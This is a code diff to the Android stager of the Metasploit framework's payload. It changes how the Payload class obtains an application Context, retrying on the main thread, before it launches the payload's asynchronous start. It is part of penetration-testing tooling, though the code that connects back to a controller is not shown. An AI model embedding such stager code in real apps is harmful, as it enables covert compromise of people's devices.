@@ -1,6 +1,8 @@
 package com.metasploit.stage;
 
 import android.content.Context;
+import android.os.Handler;
+import android.os.Looper;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
@@ -20,20 +22,45 @@ public class Payload {
     public static Context context;
 
     public static void start() {
-        Context context = null;
-        try {
-            final Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
-            final Method method = activityThreadClass.getMethod("currentApplication");
-            context = (Context) method.invoke(null, (Object[]) null);
-        } catch (Exception e) {
-            e.printStackTrace();
+        if (context == null) {
+            try {
+                final Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
+                final Method currentApplication = activityThreadClass.getMethod("currentApplication");
+                context = (Context) currentApplication.invoke(null, (Object[]) null);
+                if (context == null) {
+                    Handler handler = new Handler(Looper.getMainLooper());
+                    handler.post(new Runnable() {
+                        @Override
+                        public void run() {
+                            Context application = null;
+                            try {
+                                application = (Context) currentApplication.invoke(null, (Object[]) null);
+                            } catch (Exception e) {
+                                e.printStackTrace();
+                            }
+                            if (application != null) {
+                                startWithContext(application);
+                            } else {
+                                startAsync();
+                            }
+                        }
+                    });
+                } else {
+                    startWithContext(context);
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        } else {
+            startWithContext(context);
         }
+    }
+
+    public static void startWithContext(Context context) {
+        Payload.context = context.getApplicationContext();
 
         // Set the working directory somewhere writeable
         System.setProperty("user.dir", context.getFilesDir().getAbsolutePath());
-
-        // Store the context
-        Payload.context = context.getApplicationContext();
 
         startAsync();
     }
